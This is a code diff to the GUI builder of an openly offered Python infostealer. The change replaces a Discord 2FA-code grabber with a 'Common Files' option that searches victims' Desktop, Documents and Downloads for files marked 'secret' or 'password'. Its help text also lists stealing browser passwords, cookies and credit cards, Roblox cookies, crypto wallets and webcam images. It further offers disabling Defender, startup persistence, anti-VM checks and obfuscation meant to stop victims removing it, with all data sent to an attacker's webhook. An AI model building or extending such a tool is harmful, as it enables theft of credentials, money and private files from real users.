@@ -44,7 +44,7 @@ class App(ctk.CTk):
             "startup": False,
             "defender": False,
             "systeminfo": False,
-            "backupcodes": False,
+            "common_files": False,
             "browser": False,
             "roblox": False,
             "obfuscation": False,
@@ -161,10 +161,10 @@ class App(ctk.CTk):
             fg_color="#5d11c3", hover_color="#5057eb")
         self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=195)
 
-        self.backupcodes = ctk.CTkCheckBox(
-            self.builder_frame, text="2FA Codes", font=ctk.CTkFont(size=17, family=self.font),
+        self.common_files = ctk.CTkCheckBox(
+            self.builder_frame, text="Common Files", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.backupcodes.grid(row=1, column=0, sticky="nw", padx=286, pady=195)
+        self.common_files.grid(row=1, column=0, sticky="nw", padx=286, pady=195)
 
         self.browser = ctk.CTkCheckBox(
             self.builder_frame, text="Browser Info", font=ctk.CTkFont(size=17, family=self.font),
@@ -234,7 +234,7 @@ class App(ctk.CTk):
                                              fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
         self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)
         
-        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser, self.webcam,
+        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.common_files, self.browser, self.webcam,
                            self.roblox, self.obfuscation, self.injection, self.wifi, self.games, self.antidebug_vm, self.discord, self.clipboard,
                            self.antispam, self.self_destruct, self.pump, self.wallets]
 
@@ -257,7 +257,7 @@ Fake Error:\nThis will make a fake error popup when the file is ran to make conf
 Ping:\nThis will ping you at the moment when information is being sent to your webhook.\n\n
 Ping Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\n
 System Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n
-2FA Codes:\nThis will get the user's discord authentification codes.\n\n
+Common Files:\nSearches Desktop, Documents, Downloads folder for files containing sensitive information (like "secret", "password", etc.) or specific file extensions (.txt, .pdf, etc.), excluding shortcuts.\n\n
 Browser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\n
 Roblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\n
 Obfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\n
@@ -358,8 +358,14 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
     def file_type_check(self, _):
         if self.fileopts.get() in ["pyinstaller (.exe)", "nuitka (.exe)"]:
             self.icon.configure(state="normal")
+            self.startup.configure(state="normal")
+            self.pump.configure(state="normal")
         elif self.fileopts.get() == ".py":
             self.icon.configure(state="disabled")
+            self.startup.configure(state="disabled")
+            self.startup.deselect()
+            self.pump.configure(state="disabled")
+            self.pump.deselect()
 
     def get_icon(self):
         REMOVE = "Remove Icon"
@@ -395,7 +401,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             "startup": self.startup,
             "defender": self.defender,
             "systeminfo": self.systeminfo,
-            "backupcodes": self.backupcodes,
+            "common_files": self.common_files,
             "browser": self.browser,
             "roblox": self.roblox,
             "obfuscation": self.obfuscation,
@@ -478,8 +484,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                         code += f.read()
                         code += "\n\n"
                 
-                if self.updated_dictionary["backupcodes"]:
-                    with open(options+"BackupCodes.py", "r", encoding="utf-8") as f:
+                if self.updated_dictionary["common_files"]:
+                    with open(options+"CommonFiles.py", "r", encoding="utf-8") as f:
                         code += f.read()
                         code += "\n\n"
                 
@@ -618,7 +624,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             
             option_module_mapping_pyinstaller = {
                 "anti_spam": ["time"],
-                "backupcodes": ["re"],
+                "common_files": ["shutil"],
                 "browser": ["sqlite3", "win32crypt", "Cryptodome.Cipher.AES", "base64", "psutil", "typing"],
                 "clipboard": ["pyperclip"],
                 "antidebug_vm": ["psutil", "subprocess"],
